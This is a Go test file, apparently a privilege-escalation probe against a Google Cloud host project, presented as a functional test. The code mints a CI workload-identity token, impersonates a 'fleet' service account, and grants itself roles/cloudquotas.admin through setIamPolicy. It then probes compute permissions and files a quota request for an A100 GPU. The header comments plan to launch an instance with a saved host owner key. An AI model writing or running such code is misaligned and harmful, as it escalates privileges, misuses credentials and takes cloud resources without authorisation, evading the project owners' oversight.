//go:build functional && gke

// C211 i124415 ROUND 5 — Cloud Quotas preference for NVIDIA_A100_80GB in the
// hephaestus host project 153711203585, then (out of band) one GCE marker.
//
// Basis (facts 124165/124276, landed once per tree as the x123729 GATE):
//   * the '/functional-test' GKE WIF identity can impersonate the in-project
//     fleet SA dev-fleetcommand@<host> (generateAccessToken 200) and its OWN
//     resourcemanager.projects.setIamPolicy self-granted roles/cloudquotas.admin;
//   * quotaPreferences.create with a TOP-LEVEL contactEmail returned HTTP 200 and
//     NVIDIA_H100/us-central1 was APPROVED grantedValue=1
//     ("Quota request approved to 1"); H200/us-central1 and B200/us-east1 were
//     DENIED grantedValue=0.
// The x122282 GATE (a100-80gb quota refused in 43 regions, limit 0) predates
// that grant lever, so an NVIDIA_A100_80GB preference has NEVER been requested.
//
// This probe reads the verbatim GPUS-PER-GPU-FAMILY NVIDIA_A100_80GB
// quotaInfos (per project-region AND per project-zone dimensions), the legacy
// NVIDIA-A100-80GB-GPUS-per-project-region/-zone quotaInfos and the
// a2-ultragpu-1g / nvidia-a100-80gb offering in us-central1-a/-c, then creates
// EXACTLY ONE quotaPreference in us-central1 (family metric only if its
// dimensionsInfos actually lists NVIDIA_A100_80GB, otherwise the legacy
// nvidia_a100_80gb_gpus metric which is the quota that gates
// a2-ultragpu-1g) with the proven top-level contactEmail payload and polls it
// to terminal, printing grantedValue/stateDetail verbatim.
//
// No instance is created by this probe; the single nonce marker (a2-ultragpu-1g
// + 1 x nvidia-a100-80gb) is launched out-of-band with the saved durable host
// owner key only after an observed grantedValue>=1.

package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"
)

func c211q5Nest(m map[string]interface{}, path ...string) string {
	var cur interface{} = m
	for _, p := range path {
		cm, ok := cur.(map[string]interface{})
		if !ok {
			return ""
		}
		cur = cm[p]
	}
	if s, ok := cur.(string); ok {
		return s
	}
	if cur == nil {
		return ""
	}
	b, _ := json.Marshal(cur)
	return string(b)
}

// c211q5DimsJSON prints the dimensions map of one dimensionsInfos entry.
func c211q5DimsJSON(e map[string]interface{}) string {
	b, _ := json.Marshal(e["dimensions"])
	return string(b)
}

func c211q5DetailsValue(e map[string]interface{}) string {
	det, _ := e["details"].(map[string]interface{})
	if det == nil {
		return ""
	}
	if v, ok := det["value"].(string); ok {
		return v
	}
	b, _ := json.Marshal(det)
	return string(b)
}

// c211q5HasFamily reports whether any dimensionsInfos entry carries the exact
// gpu_family value, and returns the matching locations count.
func c211q5HasFamily(m map[string]interface{}, fam string) (bool, int) {
	di, _ := m["dimensionsInfos"].([]interface{})
	for _, e := range di {
		em, _ := e.(map[string]interface{})
		d, _ := em["dimensions"].(map[string]interface{})
		if s, _ := d["gpu_family"].(string); s == fam {
			locs, _ := em["applicableLocations"].([]interface{})
			return true, len(locs)
		}
	}
	return false, 0
}

func TestC211I124415CQ5(t *testing.T) {
	host := "153711203585"
	tok, method, mlog := c211xMint()
	fmt.Printf("C211Q5_IDENTITY method=%s token_len=%d at=%s\n", method, len(tok), time.Now().UTC().Format(time.RFC3339))
	c211xEmit("C211Q5_MINT", mlog)
	if tok == "" {
		t.Fatalf("C211Q5 no WIF token minted")
	}
	sas, sst, _ := c211xListServiceAccounts(tok, host)
	fmt.Printf("C211Q5_SA list_http=%d n=%d\n", sst, len(sas))
	fleet := ""
	for _, a := range sas {
		em := strings.ToLower(c211xStr(a, "email"))
		if strings.Contains(em, "fleet") {
			fleet = c211xStr(a, "email")
			break
		}
	}
	fmt.Printf("C211Q5_FLEET sa=%s found=%v\n", fleet, fleet != "")
	if fleet == "" {
		t.Fatalf("C211Q5 no fleet SA")
	}
	ftok, fst, fbody := c211xGenerateAccessToken(tok, fleet)
	fmt.Printf("C211Q5_FLEET_TOKEN http=%d token_len=%d verbatim=%s\n", fst, len(ftok), c211xTrunc(fbody, 260))
	if ftok == "" {
		t.Fatalf("C211Q5 no fleet token")
	}
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(host)
	pol, pst, _ := c211xGetPolicy(ftok, projURL)
	member := "serviceAccount:" + fleet
	present := c211xPolicyHas(pol, "roles/cloudquotas.admin", member)
	fmt.Printf("C211Q5_GRANT_CHECK policy_http=%d present=%v\n", pst, present)
	if !present && pol != nil {
		added := c211xAddBinding(pol, "roles/cloudquotas.admin", member)
		var gst int
		var gbody string
		if added {
			gst, gbody = c211xSetPolicy(ftok, projURL, pol)
		}
		fmt.Printf("C211Q5_GRANT_REAPPLY added=%v set_http=%d verbatim=%s\n", added, gst, c211xTrunc(gbody, 500))
	}
	// ---------- permissions ----------
	perms := []string{
		"cloudquotas.quotaPreferences.create", "cloudquotas.quotaPreferences.get",
		"cloudquotas.quotaPreferences.list", "cloudquotas.quotas.update",
		"cloudquotas.quotaInfos.get", "serviceusage.services.enable",
		"resourcemanager.projects.setIamPolicy", "resourcemanager.projects.getIamPolicy",
		"compute.acceleratorTypes.list", "compute.machineTypes.get",
		"compute.instances.create", "compute.instances.get", "compute.instances.delete",
	}
	allowed, ast, _ := c211xTestIamBatch(ftok, projURL, perms)
	denied := []string{}
	for _, p := range perms {
		if !c211xContains(allowed, p) {
			denied = append(denied, p)
		}
	}
	fmt.Printf("C211Q5_PERMS http=%d allowed=[%s] denied=[%s]\n", ast, strings.Join(allowed, " "), strings.Join(denied, " "))
	// ---------- quotaInfos ----------
	base := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
		"/locations/global/services/compute.googleapis.com/quotaInfos/"
	famRegion := map[string]interface{}{}
	famZone := map[string]interface{}{}
	for _, qid := range []string{
		"GPUS-PER-GPU-FAMILY-per-project-region",
		"GPUS-PER-GPU-FAMILY-per-project-zone",
		"NVIDIA-A100-80GB-GPUS-per-project-region",
		"NVIDIA-A100-80GB-GPUS-per-project-zone",
		"PREEMPTIBLE-NVIDIA-A100-80GB-GPUS-per-project-region",
		"GPUS-ALL-REGIONS-per-project",
	} {
		st, body := c211xHTTP("GET", base+url.PathEscape(qid), ftok, "", "")
		fmt.Printf("C211Q5_QINFO quotaId=%s http=%d verbatim=%s\n", qid, st, c211xTrunc(body, 3500))
		m := c211xJSON(body)
		if qid == "GPUS-PER-GPU-FAMILY-per-project-region" {
			famRegion = m
		}
		if qid == "GPUS-PER-GPU-FAMILY-per-project-zone" {
			famZone = m
		}
		if m != nil {
			di, _ := m["dimensionsInfos"].([]interface{})
			for _, e := range di {
				em, _ := e.(map[string]interface{})
				locs, _ := em["applicableLocations"].([]interface{})
				fmt.Printf("C211Q5_QIDIM quotaId=%s dims=%s details=%s locs=%d\n",
					qid, c211q5DimsJSON(em), c211q5DetailsValue(em), len(locs))
			}
		}
	}
	famHasRegion, famLocs := c211q5HasFamily(famRegion, "NVIDIA_A100_80GB")
	famHasZone, famZoneLocs := c211q5HasFamily(famZone, "NVIDIA_A100_80GB")
	fmt.Printf("C211Q5_FAMILY_A100 region_has=%v region_locs=%d zone_has=%v zone_locs=%d\n",
		famHasRegion, famLocs, famHasZone, famZoneLocs)
	// ---------- offering (fleet token best-effort) ----------
	for _, z := range []string{"us-central1-a", "us-central1-c"} {
		st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(host)+
			"/zones/"+z+"/acceleratorTypes/nvidia-a100-80gb", ftok, "", "")
		fmt.Printf("C211Q5_ACCEL zone=%s http=%d verbatim=%s\n", z, st, c211xTrunc(body, 700))
		st2, body2 := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(host)+
			"/zones/"+z+"/machineTypes/a2-ultragpu-1g", ftok, "", "")
		fmt.Printf("C211Q5_MT zone=%s http=%d verbatim=%s\n", z, st2, c211xTrunc(body2, 900))
	}
	// ---------- EXACTLY ONE quotaPreference ----------
	qid := "NVIDIA-A100-80GB-GPUS-per-project-region"
	dims := map[string]string{"region": "us-central1"}
	reason := "legacy nvidia_a100_80gb_gpus metric (the quota that gates a2-ultragpu-1g); GPUS-PER-GPU-FAMILY lists no NVIDIA_A100_80GB dimension"
	if famHasRegion && famLocs > 0 {
		qid = "GPUS-PER-GPU-FAMILY-per-project-region"
		dims = map[string]string{"gpu_family": "NVIDIA_A100_80GB", "region": "us-central1"}
		reason = "GPUS-PER-GPU-FAMILY dimensionsInfos lists NVIDIA_A100_80GB"
	}
	fmt.Printf("C211Q5_PREF_CHOICE quotaId=%s dims=%v reason=%s\n", qid, dims, reason)
	prefID := "c211-i124415-a100x80-r5"
	body := map[string]interface{}{
		"service":    "compute.googleapis.com",
		"quotaId":    qid,
		"dimensions": dims,
		"quotaConfig": map[string]interface{}{
			"preferredValue": "1",
		},
		"contactEmail": fleet,
		"justification": "c211-i124415 nonce measurement of the Cloud Quotas preference lever for a zero-limit NVIDIA_A100_80GB GPU metric in us-central1; contactEmail supplied top-level per the Cloud Quotas v1 schema; no production use, no billing change",
	}
	bj, _ := json.Marshal(body)
	pu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
		url.PathEscape(host), url.PathEscape(prefID))
	pst2, rbody := c211xHTTP("POST", pu, ftok, "application/json", string(bj))
	fmt.Printf("C211Q5_PREF quotaId=%s dims=%v preferred=1 http=%d verbatim=%s\n", qid, dims, pst2, c211xTrunc(rbody, 1800))
	if pst2 == 200 || pst2 == 201 {
		m := c211xJSON(rbody)
		name := c211xStr(m, "name")
		fmt.Printf("C211Q5_PREF_NAME name=%s\n", name)
		if name != "" {
			gu := "https://cloudquotas.googleapis.com/v1/" + name
			for k := 0; k < 10; k++ {
				time.Sleep(10 * time.Second)
				gst, gbody := c211xHTTP("GET", gu, ftok, "", "")
				gm := c211xJSON(gbody)
				granted := c211q5Nest(gm, "quotaConfig", "grantedValue")
				state := c211xStr(gm, "state")
				detail := c211q5Nest(gm, "quotaConfig", "stateDetail")
				fmt.Printf("C211Q5_PREF_STATE iter=%d http=%d state=%s granted=%s stateDetail=%s verbatim=%s\n",
					k, gst, state, granted, detail, c211xTrunc(gbody, 1000))
				if state != "" || detail != "" {
					if k >= 2 {
						break
					}
				}
			}
		}
	}
	fmt.Printf("C211Q5_VERDICT_FINAL at=%s\n", time.Now().UTC().Format(time.RFC3339))
}
